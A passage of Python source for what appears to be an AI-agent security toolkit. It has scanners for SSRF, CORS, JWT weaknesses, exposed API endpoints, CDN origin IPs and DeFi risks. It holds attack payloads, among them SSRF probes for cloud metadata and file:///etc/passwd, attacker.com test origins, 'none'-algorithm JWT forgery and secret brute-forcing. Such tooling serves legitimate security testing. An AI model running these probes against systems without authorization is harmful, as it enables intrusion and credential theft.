    trace, progress, exec_dir = _init_tool_context("defi_protocol_scan", target, 6)
    inputs = {"protocol_url": protocol_url, "contract_address": contract_address, "chain": chain}

    progress.update("Checking protocol info")
    defi_risks = []

    if protocol_url:
        progress.update("Scanning web frontend")
        url = protocol_url if protocol_url.startswith("http") else f"https://{protocol_url}"
        curl_cmd = ["curl", "-sk", "--max-time", "15", url]
        web_result = run_command_advanced(curl_cmd, timeout=20, trace=trace)
        body = web_result["stdout"].lower()

        risk_indicators = {
            "unlimited_approval": ["approve", "unlimited", "max_uint", "type(uint256).max"],
            "no_timelock": ["timelock" not in body and "governance" in body],
            "centralized_admin": ["owner", "admin", "setfee", "setprice", "withdraw"],
            "no_audit_mentioned": ["audit" not in body],
            "suspicious_tokenomics": ["100% tax", "honeypot", "blacklist"]
        }
        for risk, indicators in risk_indicators.items():
            if isinstance(indicators[0], bool):
                if indicators[0]:
                    defi_risks.append({"type": risk, "severity": "MEDIUM", "source": "frontend"})
            else:
                for ind in indicators:
                    if ind in body:
                        defi_risks.append({"type": risk, "severity": "HIGH", "indicator": ind, "source": "frontend"})
                        break

    progress.update("Common DeFi attack vectors")
    attack_vectors = [
        {"name": "Flash Loan Attack", "description": "Borrow large amounts to manipulate price/state", "severity": "CRITICAL"},
        {"name": "Oracle Manipulation", "description": "Manipulate price feeds via low liquidity pools", "severity": "CRITICAL"},
        {"name": "Governance Attack", "description": "Acquire voting power to pass malicious proposals", "severity": "HIGH"},
        {"name": "Rug Pull", "description": "Developer removes liquidity or mints tokens", "severity": "CRITICAL"},
        {"name": "Sandwich Attack", "description": "Front-run and back-run user transactions", "severity": "MEDIUM"},
        {"name": "Impermanent Loss Exploit", "description": "Manipulate pool ratios", "severity": "MEDIUM"}
    ]

    progress.update("Token contract checks")
    if contract_address:
        token_cmd = ["curl", "-s", "--max-time", "15",
                    f"https://api.etherscan.io/api?module=contract&action=getsourcecode&address={contract_address}"]
        token_result = run_command_advanced(token_cmd, timeout=20, trace=trace)

    progress.update("Analysis")
    output = {
        "status": "success", "target": target, "chain": chain,
        "risks_identified": len(defi_risks), "risks": defi_risks,
        "common_attack_vectors": attack_vectors,
        "recommendations": [
            "Verify audit reports from reputable firms (Trail of Bits, OpenZeppelin, Certik)",
            "Check contract verification on block explorer",
            "Verify timelock on admin functions",
            "Check token approval amounts before interacting",
            "Review governance token distribution and voting thresholds",
            "Test with small amounts first"
        ],
        "severity": "HIGH" if defi_risks else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("defi_protocol_scan", target, output)
    log_tool_execution("defi_protocol_scan", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def blockchain_tx_analyzer(
    tx_hash: str = "",
    address: str = "",
    chain: str = "ethereum",
    timeout: int = 60
) -> str:
    """
    Blockchain transaction analysis. Traces fund flows, identifies suspicious patterns, analyzes gas usage and contract interactions.
    """
    target = tx_hash or address or "unknown"
    trace, progress, exec_dir = _init_tool_context("blockchain_tx_analyzer", target, 5)
    inputs = {"tx_hash": tx_hash, "address": address, "chain": chain}

    progress.update("Querying blockchain API")
    explorers = {
        "ethereum": "https://api.etherscan.io/api",
        "bsc": "https://api.bscscan.com/api",
        "polygon": "https://api.polygonscan.com/api"
    }
    base_api = explorers.get(chain, explorers["ethereum"])
    results = {}

    if tx_hash:
        tx_cmd = ["curl", "-s", "--max-time", "15",
                 f"{base_api}?module=proxy&action=eth_getTransactionByHash&txhash={tx_hash}"]
        tx_result = run_command_advanced(tx_cmd, timeout=20, trace=trace)
        try:
            results["transaction"] = json.loads(tx_result["stdout"])
        except Exception:
            results["transaction"] = {"raw": tx_result["stdout"][:2000]}

    if address:
        progress.update("Analyzing address")
        bal_cmd = ["curl", "-s", "--max-time", "15",
                  f"{base_api}?module=account&action=balance&address={address}"]
        bal_result = run_command_advanced(bal_cmd, timeout=20, trace=trace)
        try:
            results["balance"] = json.loads(bal_result["stdout"])
        except Exception:
            pass

        txlist_cmd = ["curl", "-s", "--max-time", "15",
                     f"{base_api}?module=account&action=txlist&address={address}&startblock=0&endblock=99999999&page=1&offset=10&sort=desc"]
        txlist_result = run_command_advanced(txlist_cmd, timeout=20, trace=trace)
        try:
            results["recent_transactions"] = json.loads(txlist_result["stdout"])
        except Exception:
            pass

    progress.update("Pattern analysis")
    suspicious_patterns = []
    tx_data = results.get("transaction", {}).get("result", {})
    if isinstance(tx_data, dict):
        gas = int(tx_data.get("gas", "0x0"), 16) if tx_data.get("gas") else 0
        value = int(tx_data.get("value", "0x0"), 16) if tx_data.get("value") else 0
        if gas > 500000:
            suspicious_patterns.append({"type": "high_gas", "value": gas, "severity": "MEDIUM"})
        if value > 10**20:
            suspicious_patterns.append({"type": "large_transfer", "value_eth": value / 10**18, "severity": "HIGH"})

    progress.update("Analysis")
    output = {
        "status": "success", "target": target, "chain": chain,
        "data": results,
        "suspicious_patterns": suspicious_patterns,
        "severity": "HIGH" if suspicious_patterns else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("blockchain_tx_analyzer", target, output)
    log_tool_execution("blockchain_tx_analyzer", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# OSINT TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def origin_ip_hunter(
    target: str,
    methods: str = "all",
    timeout: int = 120
) -> str:
    """
    Discover origin IP behind CDN/WAF (Cloudflare, Akamai, etc.) using DNS history, certificate transparency, and direct probing.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("origin_ip_hunter", target, 7)
    inputs = {"target": target, "methods": methods}

    found_ips = {}

    progress.update("Current DNS resolution")
    try:
        current_ip = socket.gethostbyname(target)
        found_ips["current_dns"] = [current_ip]
    except Exception:
        current_ip = None

    progress.update("SecurityTrails DNS history")
    hist_cmd = ["curl", "-s", "--max-time", "15",
               f"https://api.securitytrails.com/v1/history/{target}/dns/a"]
    hist_result = run_command_advanced(hist_cmd, timeout=20, trace=trace)

    progress.update("Certificate search (crt.sh)")
    crt_cmd = ["curl", "-s", "--max-time", "20",
              f"https://crt.sh/?q={target}&output=json"]
    crt_result = run_command_advanced(crt_cmd, timeout=25, trace=trace)

    progress.update("Direct IP connection probing")
    common_subdomains = ["mail", "ftp", "cpanel", "webmail", "direct", "origin",
                        "old", "legacy", "dev", "staging", "test", "api"]
    for sub in common_subdomains:
        fqdn = f"{sub}.{target}"
        try:
            ip = socket.gethostbyname(fqdn)
            if ip != current_ip:
                found_ips.setdefault("subdomain_leak", []).append({"subdomain": fqdn, "ip": ip})
        except Exception:
            pass

    progress.update("MX/SPF record check")
    mx_cmd = ["dig", "+short", target, "MX"]
    mx_result = run_command_advanced(mx_cmd, timeout=10, trace=trace)
    spf_cmd = ["dig", "+short", target, "TXT"]
    spf_result = run_command_advanced(spf_cmd, timeout=10, trace=trace)

    mx_ips = []
    for line in mx_result["stdout"].split("\n"):
        parts = line.split()
        if len(parts) >= 2:
            mx_host = parts[-1].rstrip(".")
            try:
                mx_ip = socket.gethostbyname(mx_host)
                mx_ips.append({"mx_host": mx_host, "ip": mx_ip})
            except Exception:
                pass
    if mx_ips:
        found_ips["mx_records"] = mx_ips

    spf_ips = re.findall(r'ip4:(\d+\.\d+\.\d+\.\d+)', spf_result["stdout"])
    if spf_ips:
        found_ips["spf_records"] = spf_ips

    progress.update("Analysis")
    all_candidate_ips = set()
    for method, ips in found_ips.items():
        if isinstance(ips, list):
            for ip in ips:
                if isinstance(ip, dict):
                    all_candidate_ips.add(ip.get("ip", ""))
                else:
                    all_candidate_ips.add(ip)
    all_candidate_ips.discard("")
    all_candidate_ips.discard(current_ip)

    output = {
        "status": "success", "target": target,
        "current_ip": current_ip,
        "candidate_origin_ips": sorted(all_candidate_ips),
        "methods_results": found_ips,
        "spf_text": spf_result["stdout"][:500],
        "total_candidates": len(all_candidate_ips),
        "severity": "HIGH" if all_candidate_ips else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("origin_ip_hunter", target, output)
    log_tool_execution("origin_ip_hunter", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def osint_domain_intel(
    target: str,
    depth: str = "standard",
    timeout: int = 120
) -> str:
    """
    OSINT domain intelligence gathering. Combines WHOIS, DNS, technology detection, SSL certificate analysis, and social media presence.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("osint_domain_intel", target, 7)
    inputs = {"target": target, "depth": depth}

    intel = {}

    progress.update("WHOIS lookup")
    whois_result = run_command_advanced(["whois", target], timeout=30, trace=trace)
    whois_data = {}
    for line in whois_result["stdout"].split("\n"):
        if ":" in line and not line.strip().startswith("%"):
            k, _, v = line.partition(":")
            k, v = k.strip(), v.strip()
            if k and v and len(k) < 50:
                whois_data[k] = v
    intel["whois"] = whois_data

    progress.update("DNS records")
    dns_data = {}
    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA"]:
        r = run_command_advanced(["dig", "+short", target, rtype], timeout=10, trace=trace)
        records = [l.strip() for l in r["stdout"].split("\n") if l.strip()]
        if records:
            dns_data[rtype] = records
    intel["dns"] = dns_data

    progress.update("SSL certificate analysis")
    ssl_cmd = ["openssl", "s_client", "-connect", f"{target}:443", "-servername", target]
    ssl_result = run_command_advanced(ssl_cmd, timeout=15, trace=trace)
    ssl_info = {}
    for line in ssl_result["stdout"].split("\n"):
        for key in ["subject=", "issuer=", "notBefore=", "notAfter="]:
            if line.strip().startswith(key) or f" {key}" in line:
                ssl_info[key.rstrip("=")] = line.split(key)[-1].strip()
    intel["ssl"] = ssl_info

    progress.update("HTTP technology fingerprint")
    curl_cmd = ["curl", "-sI", "-k", "--max-time", "10", f"https://{target}"]
    curl_result = run_command_advanced(curl_cmd, timeout=15, trace=trace)
    headers = {}
    for line in curl_result["stdout"].split("\n"):
        if ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip().lower()] = v.strip()
    intel["http_headers"] = headers

    if depth == "deep":
        progress.update("Deep OSINT")
        robots_cmd = ["curl", "-sk", "--max-time", "10", f"https://{target}/robots.txt"]
        robots_result = run_command_advanced(robots_cmd, timeout=15, trace=trace)
        intel["robots_txt"] = robots_result["stdout"][:2000]

        sitemap_cmd = ["curl", "-sk", "--max-time", "10", f"https://{target}/sitemap.xml"]
        sitemap_result = run_command_advanced(sitemap_cmd, timeout=15, trace=trace)
        intel["sitemap"] = sitemap_result["stdout"][:2000]

    progress.update("Analysis")
    output = {
        "status": "success", "target": target, "depth": depth,
        "intelligence": intel,
        "summary": {
            "registrar": whois_data.get("Registrar", "unknown"),
            "nameservers": dns_data.get("NS", []),
            "mail_servers": dns_data.get("MX", []),
            "ip_addresses": dns_data.get("A", []),
            "server": headers.get("server", "unknown"),
            "ssl_issuer": ssl_info.get("issuer", "unknown")
        }
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("osint_domain_intel", target, output)
    log_tool_execution("osint_domain_intel", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# SECURITY SCANNER TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def cors_scanner(
    target: str,
    origins_to_test: str = "",
    timeout: int = 60
) -> str:
    """
    CORS misconfiguration scanner. Tests for wildcard origins, null origin, credential reflection, and subdomain trust.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("cors_scanner", target, 5)
    url = target if target.startswith("http") else f"https://{target}"
    inputs = {"target": url}

    progress.update("Testing CORS origins")
    domain = target.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
    test_origins = [
        f"https://evil-{domain}", "https://attacker.com", "null",
        f"https://{domain}.attacker.com", f"https://sub.{domain}",
        f"http://{domain}", "https://localhost", f"https://{domain}%60.attacker.com",
        f"https://{domain}_.attacker.com"
    ]
    if origins_to_test:
        test_origins.extend([o.strip() for o in origins_to_test.split(",") if o.strip()])

    results = []
    for origin in test_origins:
        cmd = ["curl", "-sI", "-k", "--max-time", "10", "-H", f"Origin: {origin}", url]
        r = run_command_advanced(cmd, timeout=15, trace=trace)
        acao = ""
        acac = ""
        for line in r["stdout"].split("\n"):
            ll = line.lower()
            if "access-control-allow-origin" in ll:
                acao = line.split(":", 1)[-1].strip()
            if "access-control-allow-credentials" in ll:
                acac = line.split(":", 1)[-1].strip()

        vulnerable = False
        vuln_type = ""
        if acao == "*":
            vulnerable = True
            vuln_type = "wildcard_origin"
        elif acao == origin:
            vulnerable = True
            vuln_type = "reflected_origin"
        elif acao == "null" and origin == "null":
            vulnerable = True
            vuln_type = "null_origin_allowed"

        if vulnerable and acac.lower() == "true":
            vuln_type += "+credentials"

        results.append({
            "origin_tested": origin, "acao": acao, "acac": acac,
            "vulnerable": vulnerable, "vuln_type": vuln_type
        })

    progress.update("Analyzing preflight")
    preflight_cmd = ["curl", "-sI", "-k", "--max-time", "10", "-X", "OPTIONS",
                    "-H", "Origin: https://attacker.com",
                    "-H", "Access-Control-Request-Method: PUT",
                    "-H", "Access-Control-Request-Headers: X-Custom", url]
    preflight_r = run_command_advanced(preflight_cmd, timeout=15, trace=trace)

    progress.update("Analysis")
    vulns = [r for r in results if r["vulnerable"]]
    output = {
        "status": "success", "target": url,
        "total_tests": len(results), "vulnerabilities_found": len(vulns),
        "results": results,
        "preflight_response": preflight_r["stdout"][:1000],
        "severity": "CRITICAL" if any("+credentials" in r.get("vuln_type", "") for r in vulns) else
                   ("HIGH" if vulns else "info"),
        "recommendations": [
            "Never reflect arbitrary origins",
            "Avoid wildcard (*) with credentials",
            "Whitelist specific trusted origins",
            "Validate Origin header server-side"
        ] if vulns else ["CORS configuration appears secure"]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("cors_scanner", target, output)
    log_tool_execution("cors_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def jwt_analyzer(
    token: str,
    secret_wordlist: str = "",
    timeout: int = 60
) -> str:
    """
    JWT token security analyzer. Decodes header/payload, checks algorithm confusion, none algorithm, weak secrets, expiration issues.
    """
    target = "jwt_analysis"
    trace, progress, exec_dir = _init_tool_context("jwt_analyzer", target, 6)
    inputs = {"token_length": len(token), "has_wordlist": bool(secret_wordlist)}

    progress.update("Decoding JWT")
    parts = token.split(".")
    if len(parts) != 3:
        output = {"status": "error", "message": "Invalid JWT format (expected 3 parts)"}
        log_tool_execution("jwt_analyzer", target, inputs, output, trace, progress)
        return json.dumps(output, indent=2)

    def b64_decode(s):
        s += "=" * (4 - len(s) % 4)
        try:
            return json.loads(base64.urlsafe_b64decode(s))
        except Exception:
            return {"error": "decode_failed"}

    header = b64_decode(parts[0])
    payload = b64_decode(parts[1])

    progress.update("Analyzing header")
    vulnerabilities = []
    alg = header.get("alg", "unknown")
    if alg.lower() == "none":
        vulnerabilities.append({"type": "none_algorithm", "severity": "CRITICAL",
                               "description": "Algorithm set to 'none' - signature bypass possible"})
    if alg.startswith("HS") and header.get("typ") == "JWT":
        vulnerabilities.append({"type": "hmac_algorithm", "severity": "MEDIUM",
                               "description": "HMAC algorithm used - vulnerable to key confusion if RSA expected"})
    if "kid" in header:
        vulnerabilities.append({"type": "kid_injection", "severity": "HIGH",
                               "description": "KID header present - test for SQL injection or path traversal in kid value"})
    if "jku" in header or "x5u" in header:
        vulnerabilities.append({"type": "external_key_url", "severity": "HIGH",
                               "description": "External key URL present (jku/x5u) - SSRF possible"})

    progress.update("Analyzing payload")
    now = int(time.time())
    exp = payload.get("exp")
    iat = payload.get("iat")
    nbf = payload.get("nbf")
    if exp and exp < now:
        vulnerabilities.append({"type": "expired_token", "severity": "LOW",
                               "description": f"Token expired at {datetime.datetime.fromtimestamp(exp).isoformat()}"})
    if exp and iat and (exp - iat) > 86400 * 30:
        vulnerabilities.append({"type": "long_expiry", "severity": "MEDIUM",
                               "description": "Token has very long expiry (>30 days)"})
    if not exp:
        vulnerabilities.append({"type": "no_expiry", "severity": "HIGH",
                               "description": "Token has no expiration claim"})

    sensitive_claims = ["password", "secret", "key", "token", "credit_card", "ssn"]
    for claim in payload:
        if any(s in claim.lower() for s in sensitive_claims):
            vulnerabilities.append({"type": "sensitive_data_in_payload", "severity": "HIGH",
                                   "claim": claim, "description": f"Potentially sensitive claim: {claim}"})

    progress.update("Testing none algorithm bypass")
    none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
    none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    none_token = f"{none_header}.{none_payload}."

    progress.update("Secret brute force attempt")
    common_secrets = ["secret", "password", "123456", "admin", "key", "jwt_secret",
                     "changeme", "supersecret", "HS256", "your-256-bit-secret"]
    cracked_secret = None
    if alg.startswith("HS"):
        import hmac as hmac_mod
        for secret in common_secrets:
            try:
                signing_input = f"{parts[0]}.{parts[1]}".encode()
                if alg == "HS256":
                    sig = hmac_mod.new(secret.encode(), signing_input, hashlib.sha256).digest()
                elif alg == "HS384":
                    sig = hmac_mod.new(secret.encode(), signing_input, hashlib.sha384).digest()
                elif alg == "HS512":
                    sig = hmac_mod.new(secret.encode(), signing_input, hashlib.sha512).digest()
                else:
                    continue
                expected_sig = base64.urlsafe_b64encode(sig).decode().rstrip("=")
                if expected_sig == parts[2]:
                    cracked_secret = secret
                    vulnerabilities.append({"type": "weak_secret", "severity": "CRITICAL",
                                           "secret": secret, "description": f"JWT secret cracked: {secret}"})
                    break
            except Exception:
                pass

    progress.update("Complete")
    output = {
        "status": "success", "header": header, "payload": payload,
        "algorithm": alg,
        "vulnerabilities": vulnerabilities,
        "vulnerability_count": len(vulnerabilities),
        "none_algorithm_token": none_token,
        "cracked_secret": cracked_secret,
        "timestamps": {
            "issued_at": datetime.datetime.fromtimestamp(iat).isoformat() if iat else None,
            "expires_at": datetime.datetime.fromtimestamp(exp).isoformat() if exp else None,
            "not_before": datetime.datetime.fromtimestamp(nbf).isoformat() if nbf else None
        },
        "severity": "CRITICAL" if any(v["severity"] == "CRITICAL" for v in vulnerabilities) else
                   ("HIGH" if any(v["severity"] == "HIGH" for v in vulnerabilities) else "info")
    }

    output = chain_engine.enrich_with_context("jwt_analyzer", target, output)
    log_tool_execution("jwt_analyzer", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def ssrf_scanner(
    target: str,
    param: str = "url",
    method: str = "GET",
    timeout: int = 60
) -> str:
    """
    SSRF (Server-Side Request Forgery) vulnerability scanner. Tests internal network access, cloud metadata, protocol smuggling.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("ssrf_scanner", target, 5)
    url = target if target.startswith("http") else f"http://{target}"
    inputs = {"target": url, "param": param, "method": method}

    progress.update("Preparing SSRF payloads")
    ssrf_payloads = [
        {"name": "AWS metadata", "payload": "http://169.254.169.254/latest/meta-data/", "severity": "CRITICAL"},
        {"name": "GCP metadata", "payload": "http://metadata.google.internal/computeMetadata/v1/", "severity": "CRITICAL"},
        {"name": "Azure metadata", "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "severity": "CRITICAL"},
        {"name": "Localhost", "payload": "http://127.0.0.1/", "severity": "HIGH"},
        {"name": "Localhost alt", "payload": "http://0.0.0.0/", "severity": "HIGH"},
        {"name": "IPv6 localhost", "payload": "http://[::1]/", "severity": "HIGH"},
        {"name": "Internal 10.x", "payload": "http://10.0.0.1/", "severity": "HIGH"},
        {"name": "Internal 192.168.x", "payload": "http://192.168.1.1/", "severity": "HIGH"},
        {"name": "Decimal IP", "payload": "http://2130706433/", "severity": "HIGH"},
        {"name": "Hex IP", "payload": "http://0x7f000001/", "severity": "HIGH"},
        {"name": "File protocol", "payload": "file:///etc/passwd", "severity": "CRITICAL"},
        {"name": "Gopher protocol", "payload": "gopher://127.0.0.1:25/", "severity": "HIGH"},
        {"name": "Dict protocol", "payload": "dict://127.0.0.1:6379/info", "severity": "HIGH"},
        {"name": "URL redirect", "payload": "http://attacker.com/redirect?url=http://169.254.169.254/", "severity": "HIGH"},
        {"name": "DNS rebinding", "payload": "http://1.1.1.1.nip.io/", "severity": "MEDIUM"},
    ]

    progress.update("Testing SSRF payloads")
    results = []
    for sp in ssrf_payloads:
        test_url = f"{url}?{param}={urllib.parse.quote(sp['payload'])}" if method == "GET" else url
        cmd = ["curl", "-sk", "--max-time", "10", "-o", "/dev/null", "-w",
               "%{http_code}|%{size_download}|%{time_total}", test_url]
        if method == "POST":
            cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST",
                   "-d", f"{param}={urllib.parse.quote(sp['payload'])}",
                   "-o", "/dev/null", "-w", "%{http_code}|%{size_download}|%{time_total}", url]
        r = run_command_advanced(cmd, timeout=15, trace=trace)
        parts = r["stdout"].split("|")
        status_code = parts[0] if parts else "0"
        size = parts[1] if len(parts) > 1 else "0"
        vuln_indicators = status_code in ["200", "301", "302"] and int(size or "0") > 0
        results.append({
            "name": sp["name"], "payload": sp["payload"], "severity": sp["severity"],
            "status_code": status_code, "response_size": size,
            "potentially_vulnerable": vuln_indicators
        })

    progress.update("Analysis")
    vulns = [r for r in results if r["potentially_vulnerable"]]
    output = {
        "status": "success", "target": url, "parameter": param,
        "total_tests": len(results), "potential_vulnerabilities": len(vulns),
        "results": results,
        "vulnerable_payloads": vulns,
        "severity": "CRITICAL" if any(v["severity"] == "CRITICAL" and v["potentially_vulnerable"] for v in results) else
                   ("HIGH" if vulns else "info"),
        "recommendations": [
            "Whitelist allowed URLs/domains",
            "Block internal IP ranges (10.x, 172.16-31.x, 192.168.x)",
            "Block cloud metadata IPs (169.254.169.254)",
            "Disable unused URL schemes (file://, gopher://, dict://)",
            "Use network-level egress filtering"
        ] if vulns else ["No SSRF indicators detected"]
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("ssrf_scanner", target, output)
    log_tool_execution("ssrf_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def header_security_audit(
    target: str,
    timeout: int = 30
) -> str:
    """
    HTTP security headers audit. Checks CSP, HSTS, X-Frame-Options, CORS, cookie flags, and provides scoring.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("header_security_audit", target, 5)
    url = target if target.startswith("http") else f"https://{target}"
    inputs = {"target": url}

    progress.update("Fetching HTTP headers")
    cmd = ["curl", "-sI", "-k", "--max-time", "15", "-L", url]
    result = run_command_advanced(cmd, timeout=20, trace=trace)

    headers = {}
    for line in result["stdout"].split("\n"):
        if ":" in line:
            k, _, v = line.partition(":")
            headers[k.strip().lower()] = v.strip()

    progress.update("Analyzing security headers")
    checks = {}
    score = 0
    max_score = 0

    header_checks = {
        "strict-transport-security": {"weight": 15, "desc": "HSTS - Forces HTTPS",
            "good_pattern": r"max-age=\d{7,}"},
        "content-security-policy": {"weight": 15, "desc": "CSP - XSS prevention",
            "good_pattern": r"(default-src|script-src)"},
        "x-frame-options": {"weight": 10, "desc": "Clickjacking prevention",
            "good_pattern": r"(DENY|SAMEORIGIN)"},
        "x-content-type-options": {"weight": 10, "desc": "MIME type sniffing prevention",
            "good_pattern": r"nosniff"},
        "x-xss-protection": {"weight": 5, "desc": "XSS filter (legacy)",
            "good_pattern": r"1;\s*mode=block"},
        "referrer-policy": {"weight": 10, "desc": "Referrer info control",
            "good_pattern": r"(no-referrer|strict-origin|same-origin)"},
        "permissions-policy": {"weight": 10, "desc": "Feature/permissions policy",
            "good_pattern": r".+"},
        "x-permitted-cross-domain-policies": {"weight": 5, "desc": "Flash/PDF cross-domain",
            "good_pattern": r"none"},
        "cross-origin-opener-policy": {"weight": 5, "desc": "COOP - Cross-origin isolation",
            "good_pattern": r"same-origin"},
        "cross-origin-resource-policy": {"weight": 5, "desc": "CORP - Resource isolation",
            "good_pattern": r"same-origin"},
        "cross-origin-embedder-policy": {"weight": 5, "desc": "COEP - Embedding policy",
            "good_pattern": r"require-corp"},
        "cache-control": {"weight": 5, "desc": "Cache control directives",
            "good_pattern": r"no-store|private"}
    }

    for header_name, check in header_checks.items():
        max_score += check["weight"]
        value = headers.get(header_name, "")
        if value:
            good = bool(re.search(check["good_pattern"], value, re.IGNORECASE))
            if good:
                score += check["weight"]
            checks[header_name] = {
                "present": True, "value": value, "secure": good,
                "description": check["desc"],
                "score": check["weight"] if good else 0
            }
        else:
            checks[header_name] = {
                "present": False, "value": None, "secure": False,
                "description": check["desc"], "score": 0,
                "recommendation": f"Add {header_name} header"
            }

    progress.update("Checking dangerous headers")
    dangerous = {}
    for dh in ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]:
        if dh in headers:
            dangerous[dh] = headers[dh]

    cookies_analysis = []
    set_cookie = headers.get("set-cookie", "")
    if set_cookie:
        flags = {"httponly": "HttpOnly" in set_cookie, "secure": "Secure" in set_cookie,
                "samesite": "SameSite" in set_cookie}
        cookies_analysis.append({"value_preview": set_cookie[:100], "flags": flags})

    progress.update("Scoring")
    grade = "A+" if score >= max_score * 0.95 else "A" if score >= max_score * 0.85 else \
            "B" if score >= max_score * 0.70 else "C" if score >= max_score * 0.50 else \
            "D" if score >= max_score * 0.30 else "F"

    output = {
        "status": "success", "target": url,
        "score": score, "max_score": max_score,
        "grade": grade, "percentage": round(score / max_score * 100, 1) if max_score else 0,
        "header_checks": checks,
        "information_disclosure": dangerous,
        "cookies": cookies_analysis,
        "missing_headers": [k for k, v in checks.items() if not v["present"]],
        "severity": "HIGH" if grade in ["D", "F"] else ("MEDIUM" if grade == "C" else "info")
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("header_security_audit", target, output)
    log_tool_execution("header_security_audit", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


# ============================================================================
# DISCOVERY & TESTING TOOLS
# ============================================================================

@mcp.tool()
@resolve_references
async def api_endpoint_discovery(
    target: str,
    wordlist: str = "",
    methods_to_test: str = "GET,POST,PUT,DELETE,PATCH",
    timeout: int = 120
) -> str:
    """
    API endpoint discovery and testing. Discovers REST/GraphQL endpoints, tests methods, and identifies authentication requirements.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("api_endpoint_discovery", target, 6)
    url = target if target.startswith("http") else f"https://{target}"
    inputs = {"target": url, "methods": methods_to_test}

    progress.update("Testing common API paths")
    api_paths = [
        "/api", "/api/v1", "/api/v2", "/api/v3", "/graphql", "/graphiql",
        "/api/docs", "/swagger.json", "/openapi.json", "/swagger-ui",
        "/api-docs", "/.well-known/openid-configuration", "/health", "/status",
        "/api/health", "/api/status", "/api/users", "/api/admin",
        "/api/login", "/api/register", "/api/token", "/api/auth",
        "/rest", "/rest/v1", "/wp-json", "/wp-json/wp/v2",
        "/api/config", "/api/settings", "/api/info", "/api/debug",
        "/api/graphql", "/query", "/api/query", "/_api",
        "/v1", "/v2", "/api/swagger", "/docs", "/redoc"
    ]

    results = []
    for path in api_paths:
        test_url = url.rstrip("/") + path
        cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null",
               "-w", "%{http_code}|%{size_download}|%{content_type}", test_url]
        r = run_command_advanced(cmd, timeout=12, trace=trace)
        parts = r["stdout"].split("|")
        status = int(parts[0]) if parts and parts[0].isdigit() else 0
        size = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 0
        ctype = parts[2] if len(parts) > 2 else ""
        if status > 0 and status != 404:
            results.append({"path": path, "url": test_url, "status": status,
                          "size": size, "content_type": ctype})

    progress.update("Testing GraphQL introspection")
    gql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/query"]
    gql_results = []
    for gql_path in gql_endpoints:
        gql_url = url.rstrip("/") + gql_path
        introspection = '{"query": "{ __schema { types { name } } }"}'
        gql_cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST",
                   "-H", "Content-Type: application/json", "-d", introspection, gql_url]
        gql_r = run_command_advanced(gql_cmd, timeout=15, trace=trace)
        if "__schema" in gql_r["stdout"] or "types" in gql_r["stdout"]:
            gql_results.append({"endpoint": gql_path, "introspection_enabled": True,
                              "preview": gql_r["stdout"][:500]})

    progress.update("Testing HTTP methods")
    method_results = {}
    base_path = results[0]["path"] if results else "/api"
    test_url = url.rstrip("/") + base_path
    for method in methods_to_test.split(","):
        method = method.strip()
        cmd = ["curl", "-sk", "--max-time", "8", "-X", method,
               "-o", "/dev/null", "-w", "%{http_code}", test_url]
        r = run_command_advanced(cmd, timeout=12, trace=trace)
        method_results[method] = int(r["stdout"]) if r["stdout"].isdigit() else 0

    progress.update("Analysis")
    high_interest = [r for r in results if r["status"] in [200, 201, 301, 302] and
                    any(k in r["path"] for k in ["swagger", "openapi", "graphql", "admin", "debug", "config"])]

    output = {
        "status": "success", "target": url,
        "endpoints_found": len(results),
        "endpoints": results,
        "graphql": {"introspection_results": gql_results, "introspection_exposed": bool(gql_results)},
        "method_test": method_results,
        "high_interest": high_interest,
        "severity": "HIGH" if gql_results or high_interest else "info"
    }

    progress.update("Complete")
    output = chain_engine.enrich_with_context("api_endpoint_discovery", target, output)
    log_tool_execution("api_endpoint_discovery", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def subdomain_scanner(
    target: str,
    timeout: int = 120
) -> str:
    """
    Quick subdomain scanner combining DNS brute force with HTTP probing. Lighter alternative to full subdomain_enum.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("subdomain_scanner", target, 5)
    inputs = {"target": target}

    progress.update("DNS brute force")
    prefixes = ["www", "mail", "ftp", "admin", "dev", "staging", "test", "api", "app",
               "portal", "vpn", "ns1", "ns2", "blog", "shop", "cdn", "static", "docs",
